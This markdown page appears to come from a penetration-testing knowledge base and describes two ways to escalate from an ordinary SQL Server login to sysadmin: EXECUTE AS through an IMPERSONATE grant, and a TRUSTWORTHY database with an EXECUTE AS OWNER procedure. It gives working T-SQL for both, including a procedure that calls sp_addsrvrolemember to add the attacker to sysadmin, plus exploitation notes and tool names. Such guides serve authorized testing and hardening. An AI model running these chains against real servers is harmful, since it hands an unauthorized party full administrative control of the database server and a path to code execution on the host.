---
title: "MSSQL impersonation: EXECUTE AS and TRUSTWORTHY to sysadmin"
description: "Escalating inside SQL Server from a low login to sysadmin through the IMPERSONATE permission and EXECUTE AS, and through TRUSTWORTHY databases with a db_owner, the ownership chains that promote a database principal to server administrator."
keywords:
  - EXECUTE AS
  - IMPERSONATE
  - TRUSTWORTHY
  - db_owner
  - sysadmin
---

# Impersonation

SQL Server's privilege model has two well-worn escalation chains from an ordinary login to **sysadmin**, both abusing features working as designed: the **IMPERSONATE** permission with `EXECUTE AS`, and a **TRUSTWORTHY** database owned by a login you control.

## EXECUTE AS a more privileged login

If you hold `IMPERSONATE` on another login (common through over-granting, and visible during [enumeration](enumeration.md)), you simply become it:

```sql
-- find impersonable logins, then assume one; if it is sysadmin you are done
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');   -- 1
-- chain impersonations where one principal can impersonate another toward sysadmin
```

## TRUSTWORTHY database to sysadmin

If a database is **TRUSTWORTHY** and you are `db_owner` of it, a module you create with `EXECUTE AS OWNER` runs as the database owner at the **server** level. If that owner is a sysadmin (often `sa`), you create and run a procedure that adds yourself to the sysadmin role:

```sql
USE trustworthy_db;    -- is_trustworthy_on = 1 and you own it
CREATE PROCEDURE dbo.esc WITH EXECUTE AS OWNER AS
  EXEC sp_addsrvrolemember 'EXAMPLE\you', 'sysadmin';
EXEC dbo.esc;
```

## Exploitation notes

- Enumerate both conditions early: impersonable logins from `sys.server_principals`, and `is_trustworthy_on` with the database owner from `sys.databases`, so you know which chain is available before touching execution.
- The TRUSTWORTHY chain only pays off when the **database owner is highly privileged**; a sysadmin-owned trustworthy database is the jackpot.
- Reaching sysadmin unlocks [command execution](command-execution.md) and clean link hops, so impersonation is usually the step between a `public` foothold and code on the host.
- `PowerUpSQL` `Invoke-SQLAudit` / `Get-SQLServerPriv...` surface both chains automatically.

## Tools

- **PowerUpSQL** (`Invoke-SQLAudit`, `Invoke-SQLEscalatePriv`): find and exercise impersonation and TRUSTWORTHY paths.
- **Impacket `mssqlclient.py`**: run `EXECUTE AS` and the TRUSTWORTHY procedure interactively.

## References

- [NetSPI: SQL Server TRUSTWORTHY and impersonation escalation](https://www.netspi.com/blog/technical-blog/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
- [PowerUpSQL (NetSPI)](https://github.com/NetSPI/PowerUpSQL)
- [Microsoft: EXECUTE AS (Transact-SQL)](https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql)
